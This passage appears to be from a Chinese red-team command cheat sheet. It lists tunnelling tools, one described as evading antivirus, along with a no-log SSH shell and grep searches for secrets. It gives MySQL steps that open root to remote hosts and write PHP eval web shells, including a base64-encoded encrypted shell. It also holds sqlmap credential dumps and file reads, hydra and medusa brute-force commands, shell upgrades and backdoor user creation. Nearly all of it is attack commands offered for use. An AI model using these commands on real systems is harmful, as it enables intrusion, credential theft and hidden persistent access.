    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 id="fusohttpsbookshentoushitopmanualredteam_commandhtmlfuso" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#fuso"target="_blank" rel="external nofollow noopener noreferrer">fuso</a></span>
  <a href="#fusohttpsbookshentoushitopmanualredteam_commandhtmlfuso" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><ul>
<li><a href="https://github.com/editso/fuso.git"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/editso/fuso.git</a></li>
<li>相对冷门，不会被杀 在9004上开启socks5代理</li>
</ul>
<pre tabindex="0"><code>fuc.exe 159.138.0.0 9003 -h 127.0.0.1 -p 9004 -b 9004 -n test -t socks5 --bridge-host 0.0.0.0 --bridge-port 9004</code></pre><h3 id="frphttpsbookshentoushitopmanualredteam_commandhtmlfrp" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#frp"target="_blank" rel="external nofollow noopener noreferrer">frp</a></span>
  <a href="#frphttpsbookshentoushitopmanualredteam_commandhtmlfrp" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><h3 id="npshttpsbookshentoushitopmanualredteam_commandhtmlnps" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#nps"target="_blank" rel="external nofollow noopener noreferrer">nps</a></span>
  <a href="#npshttpsbookshentoushitopmanualredteam_commandhtmlnps" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p><a href="https://github.com/ehang-io/nps"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/ehang-io/nps</a></p>
<pre tabindex="0"><code> sudo ./nps install
 sudo nps start</code></pre><p>安装后配置文件位置/etc/nps，默认密码(可在配置文件里面修改)admin/123</p>
<h3 id="ioxhttpsbookshentoushitopmanualredteam_commandhtmliox" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#iox"target="_blank" rel="external nofollow noopener noreferrer">iox</a></span>
  <a href="#ioxhttpsbookshentoushitopmanualredteam_commandhtmliox" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><h3 id="stowawayhttpsbookshentoushitopmanualredteam_commandhtmlstowaway" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#stowaway"target="_blank" rel="external nofollow noopener noreferrer">Stowaway</a></span>
  <a href="#stowawayhttpsbookshentoushitopmanualredteam_commandhtmlstowaway" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p><a href="https://github.com/lz520520/Stowaway"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/lz520520/Stowaway</a></p>
<h3 id="venomhttpsbookshentoushitopmanualredteam_commandhtmlvenom" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#venom"target="_blank" rel="external nofollow noopener noreferrer">Venom</a></span>
  <a href="#venomhttpsbookshentoushitopmanualredteam_commandhtmlvenom" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p><a href="https://github.com/Dliv3/Venom"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/Dliv3/Venom</a></p>
<h2 id="sshhttpsbookshentoushitopmanualredteam_commandhtmlssh" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#ssh"target="_blank" rel="external nofollow noopener noreferrer">ssh</a></span>
  <a href="#sshhttpsbookshentoushitopmanualredteam_commandhtmlssh" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>无记录shell</p>
<pre tabindex="0"><code> ssh -T root@192.168.1.1 /usr/bin/bash -i</code></pre><h2 id="grephttpsbookshentoushitopmanualredteam_commandhtmlgrep" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#grep"target="_blank" rel="external nofollow noopener noreferrer">grep</a></span>
  <a href="#grephttpsbookshentoushitopmanualredteam_commandhtmlgrep" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>grep -E &#34;([0-9]{1,3}[\.]){3}[0-9]{1,3}&#34; -r xxx --color=auto
grep -E &#34;https?://[a-zA-Z0-9\.\/_&amp;=@$%?~#-]*&#34; -r xxx --color=auto
grep -EHirn &#34;accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into&#34; APKfolder/
grep -ohr -E &#34;https?://[a-zA-Z0-9\.\/_&amp;=@$%?~#-]*&#34; /app/ |sort|uniq &gt;&gt; test.txt</code></pre><h2 id="mysqlhttpsbookshentoushitopmanualredteam_commandhtmlmysql" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#mysql"target="_blank" rel="external nofollow noopener noreferrer">mysql</a></span>
  <a href="#mysqlhttpsbookshentoushitopmanualredteam_commandhtmlmysql" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>开远程</p>
<pre tabindex="0"><code>use mysql;  
update user set host = &#39;%&#39; where user = &#39;root&#39;;  
FLUSH PRIVILEGES ;  
select host, user from user;
 mysql -uroot -p -e &#34;select * from mysql.user;&#34; &gt;1.txt</code></pre><p>不登录直接执行sql</p>
<pre tabindex="0"><code>mysql -uaHmin -proot test -e &#34;select now()&#34; -N &gt;H:/work/target1.txt
mysql -uroot -e &#34;show databases;&#34; &gt;1.txt</code></pre><p>mysql getshell</p>
<pre tabindex="0"><code>show variables like &#39;%secure%&#39;    
select &#39;&lt;?php eval($_POST[xxx]) ?&gt;&#39; into outfile &#39;/var/www/xx.php&#39;;  
select &#39;&lt;?php eval($_POST[xx]) ?&gt;&#39; into dumpfile &#39;/var/www/xx.php&#39;;  
set global general_log=on;  
set global general_log_file=&#39;/var/www/1.php&#39;;  
select &#39;&lt;?php eval($_POST[s6]) ?&gt;&#39;;
select &#39;&lt;?php file_put_contents(&#34;abab.php&#34;,base64_decode(&#34;Jmx0Oz9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7IA0KCSRfU0VTU0lPTlsmIzM5O2smIzM5O109JGtleTsNCgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsNCglpZighZXh0ZW5zaW9uX2xvYWRlZCgmIzM5O29wZW5zc2wmIzM5OykpDQoJew0KCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7DQoJCSRwb3N0PSR0KCRwb3N0LiIiKTsNCgkJDQoJCWZvcigkaT0wOyRpJmx0O3N0cmxlbigkcG9zdCk7JGkrKykgew0KICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgDQogICAgCQkJfQ0KCX0NCgllbHNlDQoJew0KCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCgl9DQogICAgJGFycj1leHBsb2RlKCYjMzk7fCYjMzk7LCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCkge2V2YWwoJHAuIiIpO319DQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7DQo/Jmd0Ow0K&#34;));?&gt;&#39; into outfile &#39;C:/wamp/www/abb.php&#39;;</code></pre><h2 id="sqlmaphttpsbookshentoushitopmanualredteam_commandhtmlsqlmap" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#sqlmap"target="_blank" rel="external nofollow noopener noreferrer">sqlmap</a></span>
  <a href="#sqlmaphttpsbookshentoushitopmanualredteam_commandhtmlsqlmap" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>python sqlmap.py -u &#34;http://www.vuln.cn/post.php?id=1&#34; --proxy &#34;http://127.0.0.1:1080&#34;
python sqlmap.py  -u &#34;http://www.vuln.cn&#34; –cookie &#34;id=11&#34; --level 2
python sqlmap.py -u &#34;www.xxxx.com/product/detail/id/3*.html&#34; --dbms=mysql -v 3 
python sqlmap.py -u &#34;http://www.vuln.cn/post.php?id=1&#34;  --dbms mysql  --dbs
python sqlmap.py -u &#34;http://www.vuln.cn/post.php?id=1&#34;  --dbms mysql  -D test --tables
python sqlmap.py -u &#34;http://www.vuln.cn/post.php?id=1&#34;  --dbms mysql  -D test -T admin –-columns
python sqlmap.py -u &#34;http://www.vuln.cn/post.php?id=1&#34;  --dbms mysql -D test -T admin -C &#34;username,password&#34; --dump
python sqlmap.py -r &#34;c:\request.txt&#34; -p id –dbms mysql –file-read=&#34;e:\www\as\config.php&#34;</code></pre><h2 id="找可写目录httpsbookshentoushitopmanualredteam_commandhtml找可写目录" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e6%89%be%e5%8f%af%e5%86%99%e7%9b%ae%e5%bd%95"target="_blank" rel="external nofollow noopener noreferrer">找可写目录</a></span>
  <a href="#%e6%89%be%e5%8f%af%e5%86%99%e7%9b%ae%e5%bd%95httpsbookshentoushitopmanualredteam_commandhtml%e6%89%be%e5%8f%af%e5%86%99%e7%9b%ae%e5%bd%95" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>### linux
#### 在/root  war文件的同目录下
写
find /root -name war|while read file;do sh -c &#34;echo $file&#34;&gt;$(dirname $file)/finddir.txt;done
删
find /root -name war|while read file;do sh -c &#34;rm $(dirname $file)/finddir.txt&#34;;done

#### 在/root  war文件夹下
写
find /root -name war|while read file;do sh -c &#34;echo $file&#34;&gt;$file/finddir.txt;done
删
find /root -name war|while read file;do sh -c &#34;rm $file/finddir.txt&#34;;done

### windows
#### 在C:\Users\liulangmao\Desktop任意子目录  war.txt文件的同目录下
写
for /f %i in (&#39;dir /s /b C:\Users\liulangmao\Desktop\war.txt&#39;) do (echo %i &gt; %i\..\finddir.txt)
删
for /f %i in (&#39;dir /s /b C:\Users\liulangmao\Desktop\war.txt&#39;) do (del %i\..\finddir.txt)

#### 在C:\Users\liulangmao\Desktop任意子目录  war文件夹下
写
for /f %i in (&#39;dir /s /b C:\Users\liulangmao\Desktop\war&#39;) do (echo %i &gt; %i\finddir.txt)
删
for /f %i in (&#39;dir /s /b C:\Users\liulangmao\Desktop\war&#39;) do (del %i\finddir.txt)</code></pre><p>示例：在weblogic靶机/root 所有war文件夹下的finddir.txt文件中写入该war文件夹的路径。</p>
<pre tabindex="0"><code>find /root -name war|while read file;do sh -c &#34;echo $file&#34;&gt;$file/finddir.txt;done</code></pre><p>程序名找启动路径</p>
<pre tabindex="0"><code>wmic process where name=&#39;mysqld.exe&#39; get processid,executablepath,name</code></pre><p>启动路径找login.jsp</p>
<pre tabindex="0"><code>for /f %i in (&#39;dir /s /b D:\UFGOV\U8\login.jsp&#39;) do (echo %i)</code></pre><p>base64分段不换行追加写文件</p>
<pre tabindex="0"><code>echo|set /p=\&#34;PCFET0NUWVBFIGh0bWw+IDxodG1sPiA8aGVhZD4gPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiIC8+PGgxPjIwMjHlubR4eHjnvZHnu5zlronlhajlrp7miJjmvJTnu4M8L2gxPg==\&#34; &gt; D:\UFGOV\U8\webapps\demonstrate.txt</code></pre><p>解决cmd无回显问题</p>
<pre tabindex="0"><code>powershell Get-ChildItem C:</code></pre><h2 id="hydrahttpsbookshentoushitopmanualredteam_commandhtmlhydra" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#hydra"target="_blank" rel="external nofollow noopener noreferrer">hydra</a></span>
  <a href="#hydrahttpsbookshentoushitopmanualredteam_commandhtmlhydra" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>参数：
-l 指定的用户名 -L 用户名字典
-p 指定密码 -P 密码字典
-s 指定端口 
-o 输出文件
-t 任务数默认16
-f 爆破成功一个就停止
-v 报错日志详细 -V 攻击日志
&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 mysql
&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 ssh -s 22 -t 4
&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 mssql -vv
&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 rdp -V
&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 smb -vV
&gt;hydra -L /root/user.txt -P pass.txt ftp://10.1.1.10</code></pre><h2 id="medusahttpsbookshentoushitopmanualredteam_commandhtmlmedusa" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#medusa"target="_blank" rel="external nofollow noopener noreferrer">medusa</a></span>
  <a href="#medusahttpsbookshentoushitopmanualredteam_commandhtmlmedusa" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>参数：
-h 目标名或IP  -H 目标列表
-u 用户名 -U 用户名字典
-p 密码 -P 密码字典 -f 爆破成功停止 -M 指定服务 -t 线程
-n 指定端口 -e ns 尝试空密码和用户名密码相同
&gt;medusa -h ip -u sa -P /pass.txt -t 5 -f -M mssql
&gt;medusa -h ip -U /root/user.txt -P /pass.txt -t 5 -f -M mssql</code></pre><h2 id="python交互shellhttpsbookshentoushitopmanualredteam_commandhtmlpython交互shell" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#python%e4%ba%a4%e4%ba%92shell"target="_blank" rel="external nofollow noopener noreferrer">python交互shell</a></span>
  <a href="#python%e4%ba%a4%e4%ba%92shellhttpsbookshentoushitopmanualredteam_commandhtmlpython%e4%ba%a4%e4%ba%92shell" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;
python2 -c &#39;import pty;pty.spawn(&#34;/bin/sh&#34;)&#39;</code></pre><h2 id="无交互添加用户httpsbookshentoushitopmanualredteam_commandhtml无交互添加用户" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e6%97%a0%e4%ba%a4%e4%ba%92%e6%b7%bb%e5%8a%a0%e7%94%a8%e6%88%b7"target="_blank" rel="external nofollow noopener noreferrer">无交互添加用户</a></span>
  <a href="#%e6%97%a0%e4%ba%a4%e4%ba%92%e6%b7%bb%e5%8a%a0%e7%94%a8%e6%88%b7httpsbookshentoushitopmanualredteam_commandhtml%e6%97%a0%e4%ba%a4%e4%ba%92%e6%b7%bb%e5%8a%a0%e7%94%a8%e6%88%b7" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>useradd newuser;echo &#34;newuser:password&#34;|chpasswd
useradd -p `openssl passwd 123456` guest
useradd -p &#34;$(openssl passwd 123456)&#34; guest
